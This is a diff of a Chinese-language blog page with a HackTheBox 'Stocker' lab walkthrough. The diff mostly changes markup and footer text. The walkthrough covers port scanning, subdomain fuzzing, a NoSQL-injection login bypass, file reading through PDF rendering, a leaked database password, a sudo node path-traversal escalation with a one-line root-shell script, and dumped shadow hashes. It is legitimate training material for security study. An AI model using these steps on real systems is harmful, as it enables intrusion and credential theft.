@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;523  10.10.11.196                                                                                                              端口扫描22和80: 12345678">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;523  10.10.11.196   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.196Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-01-15 16:">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Stocker - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/01/15/Stocker-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;523  10.10.11.196                                                                                                              端口扫描22和80: 12345678">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;523  10.10.11.196   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.196Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-01-15 16:">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011501.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011502.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011503.jpg">
@@ -122,8 +122,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -145,7 +152,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -213,126 +220,42 @@
 </li>
 <li><h2 id="10-10-11-196"><a href="#10-10-11-196" class="headerlink" title="10.10.11.196"></a>10.10.11.196</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011501.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011501.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.196</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 16:43 CST</span><br><span class="line">Nmap scan report for 10.10.11.196</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)</span><br><span class="line">|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)</span><br><span class="line">|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://stocker.htb</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 106.79 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>需要加hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.196 stocker.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011502.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011502.jpg" alt=""></p>
 <h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>子域名可以发现dev：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://stocker.htb/" -H 'Host: FUZZ.stocker.htb' -fs 178</span><br><span class="line"></span><br><span class="line">dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 423ms]</span><br></pre></td></tr></table></figure>
 
 <h2 id="dev"><a href="#dev" class="headerlink" title="dev"></a>dev</h2><p>同样加hosts后访问,需要登录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011503.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011503.jpg" alt=""></p>
 <h1 id="NoSQL-injection"><a href="#NoSQL-injection" class="headerlink" title="NoSQL injection"></a>NoSQL injection</h1><p>基础的NoSQL injection，需要修改使用json格式，绕过登录：</p>
 <ul>
 <li>NoSQL injection - HackTricks<br><a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011504.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011505.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011504.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011505.jpg" alt=""></p>
 <h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>订单功能根据提交的参数渲染生成pdf，可以尝试提交iframe之类的，使其渲染时嵌入本地文件：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011506.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011507.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011506.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011507.jpg" alt=""></p>
 <h2 id="LFI-1"><a href="#LFI-1" class="headerlink" title="LFI"></a>LFI</h2><p>验证可行，后面就是一点点读文件：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011508.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011509.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011508.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011509.jpg" alt=""></p>
 <h2 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h2><p>/var/www/dev/index.js文件中得到密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const dbURI &#x3D; &quot;mongodb:&#x2F;&#x2F;dev:IHeardPassphrasesArePrettySecure@localhost&#x2F;dev?authSource&#x3D;admin&amp;w&#x3D;1&quot;;</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>passwd中得到的用户名angoose使用这个密码登录，得到user flag：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011510.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011510.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>sudo使用node运行指定目录下 <code>*.js</code> ：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011511.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011511.jpg" alt=""></p>
 <p>因为这里是用的是 <code>*.js</code>，那么 <code>/usr/local/scripts/../../../../xxx.js</code> 这种路径也是符合要求的，所以我们就能在可写目录写js文件，使用node运行执行任意命令</p>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/node /usr/local/scripts/../../../tmp/exp.js</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011512.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011512.jpg" alt=""></p>
 <h2 id="exp-js"><a href="#exp-js" class="headerlink" title="exp.js"></a>exp.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"child_process"</span>).spawn(<span class="string">"/usr/bin/bash"</span>, &#123;<span class="attr">stdio</span>: [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]&#125;)</span><br></pre></td></tr></table></figure>
 
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$EZqTwEpX4KybzpVB$BO02GOjBAfc&#x2F;gEUXTNVQ3J2xQFeS4sGXNnr&#x2F;zporRnTKZ46fskNi.ijPrSowdfcDn4xi4p.hCGVMaolooyHHv1:19332:0:99999:7:::</span><br><span class="line">angoose:$6$8iwZVU6fVD77ubDf$bxwtXVrJQdmmOByc0T2BwfWRe6I3pInHkQD1WmqJ8e5LkzLzDspjNYaRoNMzygN3uhheZRtPFGDfwGlMoCRSG0:19332:0:99999:7:::</span><br></pre></td></tr></table></figure>
@@ -351,7 +274,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-06-25T00:50:35.700Z" itemprop="dateUpdated">2023-06-25 08:50:35</time>
+    Last updated: <time datetime="2023-06-25T00:50:35.700Z" itemprop="dateUpdated">2023-06-25 08:50:35</time>
 </span><br>
 
 
@@ -518,11 +441,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
